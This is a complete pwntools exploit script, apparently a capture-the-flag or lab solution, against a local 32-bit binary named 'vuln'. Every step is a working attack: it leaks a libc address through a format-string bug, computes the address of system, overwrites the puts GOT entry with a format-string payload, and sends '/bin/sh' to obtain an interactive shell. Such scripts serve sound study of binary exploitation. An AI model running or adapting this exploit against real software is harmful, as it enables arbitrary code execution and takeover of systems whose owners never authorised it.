from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = process('./vuln')

# step 1: leak libc address dynamically
p.recvuntil(b'>> ')
p.sendline(b'%43$p')  # position 43 had the libc address
p.recvuntil(b'- \n')
leaked = int(p.recvline().strip(), 16)

# step 2: calculate addresses
libc_base = leaked - 2912 - libc.sym['glob64']
system = libc_base + libc.sym['system']

# step 3: overwrite puts@GOT with system
p.recvuntil(b'>> ')
payload = fmtstr_payload(4, {elf.got['puts']: system})
p.sendline(payload)

# step 4: send /bin/sh
p.recvuntil(b'>> ')
p.sendline(b'/bin/sh')
p.interactive()
